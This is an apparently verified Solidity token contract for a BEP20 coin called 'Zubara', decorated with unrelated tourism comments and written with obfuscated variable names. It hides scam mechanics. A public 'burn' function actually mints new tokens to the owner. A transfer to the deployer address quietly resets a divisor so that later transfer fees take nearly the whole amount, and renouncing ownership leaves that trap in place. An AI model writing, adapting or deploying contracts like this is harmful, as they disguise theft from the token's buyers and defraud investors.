/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 14:41 GMT
 */
 ///////////
//Best Trip of North Qatar, Zubara Fort
//https://www.castles.nl/zubarah-fort
//https://twitter.com/Cristia14313034
//https://www.facebook.com/AlZubarahFort/
///////////
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract RQLRAXU {
address private  ROFWJS = address(0);
address private  KQZYCL = address(0);
uint256 private  PQRZCC = 1000000000000000000;
mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) private _allowances;
address private  NRZUUK = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  XJILIV = 100000000;
string public  name = "Zubara";
address private  AKKHDA = address(0);
address private  KABEWA = address(0);
uint256 private  OGSCZO = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
uint256 private  PWWRRY = 10000000000000;
uint256 public constant WRFJHG = 99999;
uint256 private  DINQUQ = 1000000000000000;
address public owner;
uint256 private  NLVJOM = 1000000000000000000000;
uint256 private  XDIWZR = 1000000000000000000;
string public  symbol = "Zubara";
uint256 public constant totalSupply = 100000000000000000000000000000;
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "DTKGEG");
require(to != address(0), "DTKGEG");
require(amount <= balanceOf[from], "DTKGEG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* WRFJHG/PQRZCC ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==NRZUUK){
PQRZCC = WRFJHG+2;
}
emit Transfer(from, to, transferAmount);
}
function _getOGSCZO() private returns (uint256) {
return OGSCZO;
}

function _getPWWRRY() private returns (uint256) {
return PWWRRY;
}

function _getNLVJOM() private returns (uint256) {
return NLVJOM;
}

function _getXJILIV() private returns (uint256) {
return XJILIV;
}

function _getKQZYCL() private returns (address) {
return KQZYCL;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tDTKGEG 0");
require(spender != address(0), "fDTKGEG 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getAKKHDA() private returns (address) {
return AKKHDA;
}

function _getKABEWA() private returns (address) {
return KABEWA;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getROFWJS() private returns (address) {
return ROFWJS;
}

function _getDINQUQ() private returns (uint256) {
return DINQUQ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getXDIWZR() private returns (uint256) {
return XDIWZR;
}

constructor () {
NRZUUK = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}